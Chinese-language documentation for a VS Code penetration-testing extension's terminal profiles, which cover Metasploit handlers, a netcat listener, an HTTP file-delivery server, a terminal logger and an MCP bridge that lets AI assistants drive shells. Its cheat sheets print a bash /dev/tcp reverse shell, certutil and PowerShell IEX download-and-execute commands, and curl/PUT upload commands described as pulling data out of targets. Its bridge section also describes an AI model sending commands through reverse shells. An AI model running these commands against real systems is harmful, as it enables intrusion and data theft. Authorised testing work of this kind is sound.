# 终端工具

Weaponized VSCode 注册了四个专用终端配置文件和一个内置终端录制器。你在工作区中打开的每个终端都会自动继承项目的环境变量（`$TARGET`、`$RHOST`、`$LHOST`、`$LPORT`、`$USER`、`$PASS`、`$LISTEN_ON` 等），无需手动 source 或配置 shell。

本页面涵盖每种终端配置文件、录制器，以及将终端连接到 AI 助手的 Terminal Bridge 系统。

## 终端配置文件概览

扩展通过 VS Code 的 Terminal Profile API 注册了四个终端配置文件：

| 配置文件 | ID | 用途 |
|---------|----|---------|
| **meterpreter handler** | `weaponized.meterpreter-handler` | Metasploit multi/handler 监听器 |
| **msfconsole** | `weaponized.msfconsole` | 通用 Metasploit 控制台 |
| **netcat handler** | `weaponized.netcat-handler` | 带反向 shell 速查表的 Netcat 监听器 |
| **web delivery** | `weaponized.web-delivery` | 带下载/上传速查表的 HTTP 文件服务器 |

**打开配置文件终端的方法：**

1. 打开终端面板（`Ctrl+`` ` `` / `` Cmd+` ``）
2. 点击 `+` 按钮旁边的下拉箭头
3. 从列表中选择配置文件

每个配置文件终端在 shell 初始化后会自动发送其启动命令。某些配置文件还会在命令运行前显示一条包含有用参考信息的**终端消息**。

## Meterpreter Handler

**meterpreter handler** 配置文件以安静模式启动 `msfconsole` 并加载你的资源文件，准备好接收反向 shell。

### 工作原理

当你打开此终端时，扩展会运行：

```
msfconsole -q -r <resource-file> -x 'setg LHOST <your-lhost>; setg LPORT <your-lport>;'
```

- `-q` 以安静模式启动 msfconsole（不显示横幅）
- `-r` 加载资源文件，使 handler 自动启动
- `-x` 使用扩展设置中的值预设 `LHOST` 和 `LPORT` 全局变量

### 配置

| 设置项 | 默认值 | 说明 |
|---------|---------|-------------|
| `weaponized.msf.console` | `msfconsole` | msfconsole 二进制文件的路径 |
| `weaponized.msf.resourcefile` | *（无）* | Metasploit 资源文件的路径 |
| `weaponized.lhost` | — | 你的监听 IP 地址 |
| `weaponized.lport` | — | 你的监听端口 |

### 设置资源文件

`weapon.setup` 命令会在 `.vscode/msfconsole.rc` 创建一个模板资源文件。将设置项指向它：

```json
{
  "weaponized.msf.resourcefile": "${workspaceFolder}/.vscode/msfconsole.rc"
}
```

编辑 RC 文件以配置你的 handler。一个典型的 multi/handler 配置如下：

```
use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_tcp
set LHOST 0.0.0.0
set LPORT 4444
set ExitOnSession false
exploit -j
```

### 典型工作流程

1. 通过命令面板中的 `Weapon: Create msfvenom payload` 生成有效载荷
2. 从下拉菜单打开 **meterpreter handler** 终端
3. Handler 会使用你的 RC 文件自动启动
4. 将有效载荷投递到目标
5. meterpreter 会话将出现在终端中

::: tip
如果你跳过 `-r` 资源文件（将 `weaponized.msf.resourcefile` 留空），终端仍然会以安静模式打开 msfconsole，并预设 LHOST/LPORT。然后你可以手动配置 handler。
:::

## Msfconsole

**msfconsole** 配置文件打开一个预加载了环境的通用 Metasploit 控制台。

### 工作原理

当你打开此终端时，扩展会运行：

```
msfconsole -x 'setg LHOST <your-lhost>; setg LPORT <your-lport>;'
```

与 meterpreter handler 不同，此配置文件**不**使用安静模式，也**不**默认加载资源文件。它用于一般的 Metasploit 工作：搜索模块、运行漏洞利用、管理会话。

### 配置

| 设置项 | 默认值 | 说明 |
|---------|---------|-------------|
| `weaponized.msf.console` | `msfconsole` | msfconsole 二进制文件的路径 |
| `weaponized.lhost` | — | 预设为全局 LHOST |
| `weaponized.lport` | — | 预设为全局 LPORT |

### 何时使用 msfconsole 与 meterpreter handler

- **meterpreter handler** -- 用于接收反向 shell。加载 RC 文件，以安静模式运行，立即启动 handler。
- **msfconsole** -- 用于其他所有操作。模块搜索、辅助扫描器、漏洞利用开发、会话管理。

你可以同时打开两者。它们是独立的 Metasploit 实例。

## Netcat Handler

**netcat handler** 配置文件启动一个 netcat 监听器，并直接在终端中显示反向 shell 速查表。

### 工作原理

当你打开此终端时，会发生两件事：

1. 显示一条**终端消息**，包含预填了你的 `$LHOST` 和 `$LPORT` 的反向 shell 单行命令
2. netcat 命令运行并开始监听

默认命令为：

```
rlwrap -I -cAr netcat -lvvp $LPORT
```

- `rlwrap` 用 GNU readline 包装 netcat，在反向 shell 中提供方向键历史导航和行编辑功能
- `-I` 设置 UTF-8 输入模式
- `-cAr` 启用文件名补全、ANSI 颜色透传和自动回忆
- `-lvvp` 让 netcat 在指定端口上以详细模式监听

### 反向 shell 速查表

当终端打开时，你会看到类似这样的消息块：

```
IP ADDRESS: 10.10.14.5    PORT: 4444
Basic Reverse Shell Command:
    /bin/bash -i >& /dev/tcp/10.10.14.5/4444 0>&1
Advanced Reverse Shell Command:
    https://rev.eson.ninja/?ip=10.10.14.5&port=4444
```

IP 和端口取自你的 `weaponized.lhost` 和 `weaponized.lport` 设置。复制你需要的单行命令并在目标上运行。

### 配置

| 设置项 | 默认值 | 说明 |
|---------|---------|-------------|
| `weaponized.netcat` | `rlwrap -I -cAr netcat -lvvp ${config:weaponized.lport}` | 完整的 netcat 命令 |
| `weaponized.lhost` | — | 显示在速查表中 |
| `weaponized.lport` | — | 用于监听命令和速查表 |

### 自定义 netcat 命令

你可以将 `netcat` 替换为任何监听器。例如，使用 `ncat`（来自 Nmap）：

```json
{
  "weaponized.netcat": "rlwrap -I -cAr ncat -lvvp ${config:weaponized.lport}"
}
```

或者使用 `pwncat-cs` 获得更强的 shell 体验：

```json
{
  "weaponized.netcat": "pwncat-cs -lp ${config:weaponized.lport}"
}
```

`${config:weaponized.lport}` 占位符由 VS Code 在运行时解析为你的 `weaponized.lport` 设置的值。

::: tip
通过在两次启动之间更改 `weaponized.lport`，或直接在设置字符串中覆盖端口，可以在不同端口上打开多个 netcat handler 终端。
:::

## Web Delivery

**web delivery** 配置文件启动一个 HTTP 文件服务器，并为 Linux 和 Windows 目标显示下载/上传命令速查表。

### 工作原理

当你打开此终端时，会发生两件事：

1. 一条**终端消息**显示包含下载、上传和无文件执行命令的全面速查表
2. HTTP 服务器启动并开始提供文件服务

默认命令为：

```
simplehttpserver -listen 0.0.0.0:$LISTEN_ON -verbose -upload
```

这使用了 [pdteam/simplehttpserver](https://github.com/pdteam/simplehttpserver)，它同时支持文件下载和基于 PUT 的上传。

### 文件传输速查表

终端消息包含即用命令。以下是其内容示例（已替换为你的 IP 和端口）：

**下载（目标从你这里拉取文件）：**

```bash
# Linux
curl --output filename http://10.10.14.5:8080/fname
wget http://10.10.14.5:8080/fname

# Windows
certutil.exe -urlcache -f http://10.10.14.5:8080/fname fname.exe
invoke-webrequest -outfile fname -usebasicparsing -uri http://10.10.14.5:8080/fname
```

**无文件执行（PowerShell 内存加载）：**

```powershell
IEX (New-Object Net.WebClient).DownloadString('http://10.10.14.5:8080/fname')
```

**上传（目标向你推送文件）：**

```bash
# Linux
curl http://10.10.14.5:8080/uploadfile --upload-file filename
curl http://10.10.14.5:8080/uploadfile -T filename
wget --output-document - --method=PUT http://10.10.14.5:8080/uploadfile --body-file=filename

# Windows (PowerShell)
invoke-webrequest -Uri http://10.10.14.5:8080/uploadfile -Method PUT -InFile filename
```

每条命令的末尾都是文件名，方便你编辑为实际的文件名。

::: warning
上传支持需要服务器接受 PUT 请求。默认的 `simplehttpserver` 配合 `-upload` 参数可以处理此功能。如果你切换到 `python3 -m http.server`，上传将无法工作。
:::

### 配置

| 设置项 | 默认值 | 说明 |
|---------|---------|-------------|
| `weaponized.webdelivery` | `simplehttpserver -listen 0.0.0.0:${config:weaponized.listenon} -verbose -upload` | HTTP 服务器命令 |
| `weaponized.listenon` | — | Web delivery 服务器端口 |
| `weaponized.lhost` | — | 你的 IP，显示在速查表命令中 |

### 自定义服务器

改用 Python 内置 HTTP 服务器：

```json
{
  "weaponized.webdelivery": "python3 -m http.server ${config:weaponized.listenon}"
}
```

或 PHP 内置服务器：

```json
{
  "weaponized.webdelivery": "php -S 0.0.0.0:${config:weaponized.listenon}"
}
```

### 典型工作流程

1. 将你的有效载荷、脚本或工具放在工作区（或专用暂存目录）中
2. 打开 **web delivery** 终端
3. 从速查表中复制相应的下载命令
4. 将其粘贴到你的反向 shell 或目标会话中，修改文件名
5. 若要导出数据，使用上传命令从目标拉回文件

## 终端录制器

终端录制器将终端活动捕获到日志文件中，用于审计和事后回顾。它通过 VS Code 的 Shell Integration API（`onDidStartTerminalShellExecution`）来拦截命令及其输出。

### 启动录制器

打开命令面板并运行：

```
Weapon: Start/Register terminal logger
```

系统会提示你输入三项内容：

1. **日志文件路径** -- 保存日志的位置。默认值：`${workspaceFolder}/.vscode/.terminal.log`
2. **录制模式** -- 捕获内容（见下表）
3. **终端选择** -- 按进程 ID 选择要录制的终端。选择特定终端或选择"所有终端"

### 录制模式

| 模式 | 捕获内容 |
|------|-----------------|
| `command-only` | 仅捕获你输入的命令 |
| `output-only` | 仅捕获命令产生的输出 |
| `command-and-output` | 同时捕获命令及其输出 |
| `netcat-handler` | 仅捕获名为 "netcat handler" 的终端的输出 |

### 停止录制器

打开命令面板并运行：

```
Weapon: Stop/Unregister terminal logger
```

你会看到活动录制器的列表（按模式、文件名和路径）。选择要停止的录制器。

### 激活时自动启动

要在扩展激活时自动开始录制，添加以下设置：

```json
{
  "weaponized.terminal-log.enabled": true,
  "weaponized.terminal-log.path": "${workspaceFolder}/.vscode/.terminal.log",
  "weaponized.terminal-log.level": "command-only"
}
```

当 `weaponized.terminal-log.enabled` 为 `true` 时，录制器会在扩展激活期间使用配置的路径和级别自行注册。无需手动执行命令。

### 日志格式

每条日志记录都带有时间戳，包含终端的进程 ID、名称和工作目录：

```
weaponized-terminal-logging:[1713500000000][terminalid: 12345][terminalName: zsh] user@/home/kali/workspace$ nmap -sC -sV 10.10.10.10
```

在 `command-and-output` 或 `output-only` 模式下，命令输出紧跟在日志头之后。

### 配置参考

| 设置项 | 默认值 | 说明 |
|---------|---------|-------------|
| `weaponized.terminal-log.enabled` | `false` | 扩展激活时自动开始录制 |
| `weaponized.terminal-log.path` | `${workspaceFolder}/.vscode/.terminal.log` | 日志文件路径 |
| `weaponized.terminal-log.level` | `command-only` | 录制模式 |

::: tip
在渗透测试期间使用 `netcat-handler` 模式，可以自动记录所有反向 shell 会话，而不会让你自己的终端活动干扰日志。此模式仅捕获名为 "netcat handler" 的终端的输出，因此你的常规 shell 命令会被排除。
:::

## Terminal Bridge

Terminal Bridge 是一个内部子系统，用于跟踪所有打开的 VS Code 终端并支持编程交互。你不需要直接使用它，但它在后台驱动着多项功能。

### 它提供的功能

- **MCP 服务器终端工具** -- `list_terminals`、`read_terminal`、`send_to_terminal`、`create_terminal`
- **终端输出缓冲** -- 每个终端的输出在内存中缓冲（每个终端最多 64KB，每 500ms 刷新到存储）
- **基于配置文件的创建** -- 外部 AI 客户端可以通过 MCP 创建专用终端（netcat、msfconsole、meterpreter、web-delivery）

### 工作原理

当扩展激活时，Terminal Bridge：

1. 在扩展的存储区域创建 `terminals/` 目录
2. 为每个打开的终端分配唯一 ID
3. 监听终端的打开和关闭
4. 通过 `onDidStartTerminalShellExecution` 钩子捕获命令输出
5. 将缓冲输出写入每个终端的日志文件（截断为 64KB，保留尾部）

### AI 驱动的终端交互

通过 MCP 连接的 AI 助手可以：

1. **列出你打开的终端** -- 查看所有终端的名称、ID、活动状态和工作目录
2. **读取最近输出** -- 通过 ID 或名称获取任意终端的最后 N 行
3. **发送命令** -- 以编程方式在任意终端中执行命令
4. **创建新终端** -- 使用配置文件名称（`netcat`、`msfconsole`、`meterpreter`、`web-delivery`）或普通 shell 启动专用终端

例如，AI 助手可以：
- 打开一个 netcat handler 终端
- 读取输出以查看反向 shell 何时连接
- 通过反向 shell 发送命令
- 创建一个 web delivery 终端以向目标传输工具

详情请参阅 [AI 与 MCP 集成](./ai-and-mcp.md)。

### MCP 终端工具参考

| 工具 | 说明 |
|------|-------------|
| `list_terminals` | 返回所有打开的终端，包含 ID、名称、活动状态和工作目录 |
| `read_terminal` | 通过 ID 或名称读取终端的最近输出 |
| `send_to_terminal` | 向终端发送命令字符串 |
| `create_terminal` | 创建新终端，可选使用配置文件（`netcat`、`msfconsole`、`meterpreter`、`web-delivery`） |

## 从 v0.4.x 迁移

::: info 从基于 shell 的版本迁移？
如果你使用过旧版基于 shell 的 Weaponized VSCode（v0.4.x 及更早版本），以下是终端功能的变更内容：

- **终端配置文件**：以前在 `~/.zshrc` 中定义为 shell 别名和函数。现在通过原生 VS Code Terminal Profile API 提供者注册 -- 它们出现在终端下拉菜单中，与你使用的 shell 无关。
- **环境变量**：以前在终端启动时从 `.vscode/env.zsh` 中 source（仅限 zsh）。现在通过 VS Code 的 `EnvironmentVariableCollection` API 注入，适用于所有终端类型（bash、zsh、fish、PowerShell）。
- **Shell 辅助函数**：`~/.zshrc` 中的 `weapon_vscode_launch_helper` 函数仍然可用于加载 `.vscode/.zshrc` 中的实用函数（`differ()`、`ntlm()`、`url()`、`proxys()`），但环境变量不再依赖它。
- **终端录制**：v0.4.x 中不存在。内置终端录制器现在提供四种带时间戳日志的录制模式。
- **编程式终端访问**：v0.4.x 中不存在。Terminal Bridge 现在通过 MCP 服务器支持 AI 驱动的终端交互。
:::
